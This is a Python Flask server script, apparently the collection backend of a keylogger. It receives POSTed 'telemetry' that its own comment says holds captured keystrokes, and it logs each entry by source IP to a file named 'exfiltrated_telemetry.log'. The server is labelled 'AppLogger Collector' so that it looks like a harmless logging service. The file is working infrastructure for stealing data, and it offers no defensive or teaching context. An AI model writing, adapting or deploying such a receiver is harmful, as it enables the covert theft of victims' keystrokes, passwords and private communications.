# collector.py
from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# Configuration
LOG_FILE = "exfiltrated_telemetry.log"
PORT = 80

def write_to_disk(source_ip, status, data):
    """Appends received data to a local file with a timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"--- Entry: {timestamp} ---\n")
        f.write(f"Source IP: {source_ip}\n")
        f.write(f"Status: {status}\n")
        f.write(f"Data:\n{data}\n")
        f.write("-" * 50 + "\n\n")

@app.route('/api/v1/telemetry', methods=['POST'])
def receive_data():
    source_ip = request.remote_addr
    payload = request.get_json()

    if not payload:
        return jsonify({"status": "error", "message": "No JSON payload received"}), 400

    status = payload.get("device_status", "N/A")
    telemetry = payload.get("telemetry_data", "No data")

    print(f"[*] --- NEW DATA FROM {source_ip} ---")
    print(f"[+] Status: {status}")
    print(f"[!] Captured Data:\n{telemetry}") # This prints the actual keystrokes
    print(f"{'='*50}\n")

    write_to_disk(source_ip, status, telemetry)
    return jsonify({"status": "success", "message": "Data logged"}), 200

if __name__ == '__main__':
    print(f"--- AppLogger Collector Starting ---")
    print(f"[*] Listening on 0.0.0.0:{PORT}")
    print(f"[*] Saving all logs to: {os.path.abspath(LOG_FILE)}")

    # Run the server on all network interfaces
    app.run(host='0.0.0.0', port=PORT)